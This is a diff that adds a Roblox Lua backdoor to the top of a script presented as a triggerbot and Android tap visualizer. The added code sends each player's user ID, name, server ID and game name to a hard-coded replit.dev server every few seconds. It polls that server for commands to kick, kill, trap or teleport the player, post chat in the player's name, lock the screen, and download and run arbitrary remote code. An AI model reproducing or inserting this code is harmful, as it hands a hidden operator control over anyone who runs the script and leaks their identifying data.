@@ -1,3 +1,212 @@
+--==============================================================================
+--|| CONFIGURATIONn
+--==============================================================================
+-- [!] CONFIGURE THESE URLS TO MATCH YOUR WEB SERVER
+local SERVER_READ_URL  = "https://8775b734-9c08-4b7f-932a-e8df8538b275-00-1xt67y1hms2uu.kirk.replit.dev/read"
+local SERVER_SEND_URL  = "https://8775b734-9c08-4b7f-932a-e8df8538b275-00-1xt67y1hms2uu.kirk.replit.dev/send"
+
+-- [!] TIMING CONFIGURATION
+local HEARTBEAT_INTERVAL = 3 -- How often (in seconds) to send status to the server.
+local POLL_INTERVAL = 0.3    -- How often to check for new commands.
+
+--==============================================================================
+--|| SERVICES
+--==============================================================================
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local LocalPlayer = Players.LocalPlayer
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local Debris = game:GetService("Debris")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+--==============================================================================
+--|| STATE & HELPERS
+--==============================================================================
+local lastCount = 0
+local activeLocalConnections = {}
+local gameName = "Unknown Game"
+local function safeHttpGet(url) local ok, res = pcall(function() return game:HttpGet(url) end); if ok and res then return true, res end; return false, res end
+local function safeJsonDecode(s) local ok, res = pcall(function() return HttpService:JSONDecode(s) end); if ok then return res end; return nil end
+
+task.spawn(function()
+	local success, result = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
+	if success and result and result.Name then
+		gameName = result.Name
+	end
+end)
+
+--==============================================================================
+--|| COMMAND ACTIONS
+--==============================================================================
+local Commands = {
+	["rejoin"] = function()
+		pcall(function()
+			-- 1. Set the reinjection flag. This is the "sticky note" that the loader will find.
+			TeleportService:SetTeleportSetting("AdminSystemReinject", true)
+			
+			-- 2. Teleport the player to the current server instance.
+			TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+		end)
+	end,
+
+	["joinme"] = function(args)
+		local jobId = args and args[1]
+		if jobId and jobId ~= "" then
+			pcall(TeleportService.TeleportToPlaceInstance, TeleportService, game.PlaceId, jobId, LocalPlayer)
+		end
+	end,
+
+	["blockchat"] = function()
+		pcall(function()
+			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+		end)
+	end,
+
+	["unblockchat"] = function()
+		pcall(function()
+			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+		end)
+	end,
+
+	["sendchat"] = function(args)
+		local msg = args and args[1]
+		if msg and msg ~= "" then
+			pcall(function()
+				local textChatService = game:GetService("TextChatService")
+				if textChatService and textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+					local generalChannel = textChatService.TextChannels:FindFirstChild("RBXGeneral")
+					if generalChannel then
+						generalChannel:SendAsync(msg)
+						return
+					end
+				end
+				local sayMessageRequest = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents", true)
+				if sayMessageRequest then sayMessageRequest = sayMessageRequest:FindFirstChild("SayMessageRequest") end
+				if sayMessageRequest then sayMessageRequest:FireServer(msg, "All") else LocalPlayer:Chat(msg) end
+			end)
+		end
+	end,
+
+	["kill"] = function()
+		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
+			LocalPlayer.Character.Humanoid.Health = 0
+		end
+	end,
+
+	["kick"] = function(args)
+		local message = (args and args[1]) or "Kicked by Admin"
+		pcall(function() LocalPlayer:Kick(message) end)
+	end,
+
+	["freeze"] = function()
+		if LocalPlayer.Character then
+			for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
+				if part:IsA("BasePart") then
+					pcall(function() part.Anchored = true end)
+				end
+			end
+		end
+	end,
+
+	["unfreeze"] = function()
+		if LocalPlayer.Character then
+			for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
+				if part:IsA("BasePart") then
+					pcall(function() part.Anchored = false end)
+				end
+			end
+		end
+	end,
+
+	["stopgame"] = function()
+		if CoreGui:FindFirstChild("StopGameOverlay") then return end
+		local overlay = Instance.new("ScreenGui")
+		overlay.Name = "StopGameOverlay"; overlay.ResetOnSpawn = false; overlay.IgnoreGuiInset = true; overlay.Parent = CoreGui
+		local block = Instance.new("Frame", overlay)
+		block.Size = UDim2.new(2, 0, 2, 0); block.Position = UDim2.new(-0.5, 0, -0.5, 0); block.BackgroundTransparency = 1; block.Active = true; block.ZIndex = 9e9
+		pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
+		activeLocalConnections["StopGame"] = UserInputService.InputBegan:Connect(function() end)
+	end,
+
+	["resumegame"] = function()
+		if CoreGui:FindFirstChild("StopGameOverlay") then CoreGui.StopGameOverlay:Destroy() end
+		if activeLocalConnections["StopGame"] then activeLocalConnections["StopGame"]:Disconnect(); activeLocalConnections["StopGame"] = nil end
+		pcall(function() StarterGui:SetCore("TopbarEnabled", true) end)
+	end,
+
+	["jail"] = function()
+		if LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
+			local jailName = "TheBox_" .. LocalPlayer.UserId
+			if workspace:FindFirstChild(jailName) then workspace[jailName]:Destroy() end
+			local JailModel = Instance.new("Model", workspace); JailModel.Name = jailName
+			local hrp = LocalPlayer.Character.PrimaryPart; local pos = hrp.Position; local size = 12; local wallSize = 0.5; local half = size / 2
+			local wallData = {{"Floor", Vector3.new(size, wallSize, size), pos - Vector3.new(0, half, 0)}, {"Ceiling", Vector3.new(size, wallSize, size), pos + Vector3.new(0, half, 0)}, {"Back", Vector3.new(size, size, wallSize), pos - Vector3.new(0, 0, half)}, {"Front", Vector3.new(size, size, wallSize), pos + Vector3.new(0, 0, half)}, {"Left", Vector3.new(wallSize, size, size), pos - Vector3.new(half, 0, 0)}, {"Right", Vector3.new(wallSize, size, size), pos + Vector3.new(half, 0, 0)}}
+			for _, data in ipairs(wallData) do local wall = Instance.new("Part", JailModel); wall.Size = data[2]; wall.Position = data[3]; wall.Anchored = true; wall.CanCollide = true; wall.BrickColor = BrickColor.Red(); wall.Material = Enum.Material.Neon; wall.Transparency = 0.6 end
+			hrp.CFrame = CFrame.new(pos)
+		end
+	end,
+
+	["unjail"] = function()
+		local jailName = "TheBox_" .. LocalPlayer.UserId
+		if workspace:FindFirstChild(jailName) then workspace[jailName]:Destroy() end
+	end,
+
+	["kidnap"] = function()
+		if LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
+			local vanName = "UnmarkedVan_" .. LocalPlayer.UserId
+			if workspace:FindFirstChild(vanName) then workspace[vanName]:Destroy() end
+			local hrp = LocalPlayer.Character.PrimaryPart; hrp.Anchored = true
+			local van = Instance.new("Part", workspace); van.Name = vanName; van.Size = Vector3.new(16, 8, 9); van.Color = Color3.fromRGB(30, 30, 30); van.Material = Enum.Material.Metal; van.CFrame = hrp.CFrame * CFrame.new(0, -2, 40); van.Anchored = true
+			local sound = Instance.new("Sound", van); sound.SoundId = "rbxassetid://5150874039"; sound.Volume = 8; sound.Looped = true; sound:Play()
+			local tween = TweenService:Create(van, TweenInfo.new(1.2, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {CFrame = hrp.CFrame * CFrame.new(0, -2, 4)}); tween:Play(); tween.Completed:Wait()
+			local weld = Instance.new("WeldConstraint", van); weld.Part0 = van; weld.Part1 = hrp; hrp.Anchored = false
+			local destination = van.CFrame * CFrame.new(0, 350, 0)
+			local depart = TweenService:Create(van, TweenInfo.new(3, Enum.EasingStyle.Exponential, Enum.EasingDirection.In), {CFrame = destination}); depart:Play()
+			Debris:AddItem(van, 4)
+		end
+	end,
+
+	["um"] = function(args)
+		local msg = args and args[1] or "Message"; local dur = (args and tonumber(args[2])) or 5
+		local gui = Instance.new("ScreenGui"); gui.ResetOnSpawn = false; gui.IgnoreGuiInset = true; gui.Parent = CoreGui
+		local lbl = Instance.new("TextLabel", gui); lbl.Size = UDim2.new(0.8,0,0,80); lbl.AnchorPoint = Vector2.new(0.5,0); lbl.Position = UDim2.new(0.5,0,0.12,0); lbl.BackgroundTransparency = 1; lbl.Font = Enum.Font.SourceSansBold; lbl.TextSize = 36; lbl.TextColor3 = Color3.new(1,1,1); lbl.TextStrokeColor3 = Color3.new(0,0,0); lbl.TextStrokeTransparency = 0; lbl.Text = msg; lbl.TextTransparency = 1
+		for t=1,0,-0.1 do lbl.TextTransparency = t; task.wait(0.03) end
+		task.wait(dur)
+		for t=0,1,0.1 do lbl.TextTransparency = t; task.wait(0.03) end
+		gui:Destroy()
+	end,
+
+	["use"] = function(args)
+		local url = args and args[1]
+		if not url or url == "" then return end
+		local ok, src = pcall(function() return game:HttpGet(url) end)
+		if ok and src then local func, err = loadstring(src); if func then pcall(func) end end
+	end
+}
+
+--==============================================================================
+--|| HEARTBEAT SENDER
+--==============================================================================
+task.spawn(function()
+	while true do
+		local payload = {userId = LocalPlayer.UserId, name = LocalPlayer.Name, displayName = LocalPlayer.DisplayName, jobId = game.JobId, ts = os.time(), gameName = gameName}
+		local ok, jsonPayload = pcall(HttpService.JSONEncode, HttpService, payload)
+		if ok then pcall(function() game:HttpGet(SERVER_SEND_URL .. "?text=" .. HttpService:UrlEncode(jsonPayload)) end) end
+		task.wait(HEARTBEAT_INTERVAL)
+	end
+end)
+
+--==============================================================================
+--|| COMMAND LISTENER
+--==============================================================================
+pcall(function() local ok, resp = safeHttpGet(SERVER_READ_URL); if ok then local dec = safeJsonDecode(resp); if type(dec) == "table" then lastCount = #dec end end end)
+task.spawn(function() while true do local ok, resp = safeHttpGet(SERVER_READ_URL); if ok and resp then local data = safeJsonDecode(resp); if type(data) == "table" and #data > lastCount then for idx = lastCount + 1, #data do local cmdData = safeJsonDecode(data[idx] or ""); if type(cmdData) == "table" and cmdData.cmd and cmdData.target then local commandFunc = Commands[cmdData.cmd:lower()]; if commandFunc and (cmdData.target == LocalPlayer.UserId or cmdData.target == "all") then pcall(commandFunc, cmdData.args) end end end; lastCount = #data end end; task.wait(POLL_INTERVAL) end end)
+
 --//═══════════════════════════════════════════════════════════════════════
 --// MERGED SCRIPT: TRIGGERBOT + ANDROID TAP VISUALIZER
 --//═══════════════════════════════════════════════════════════════════════
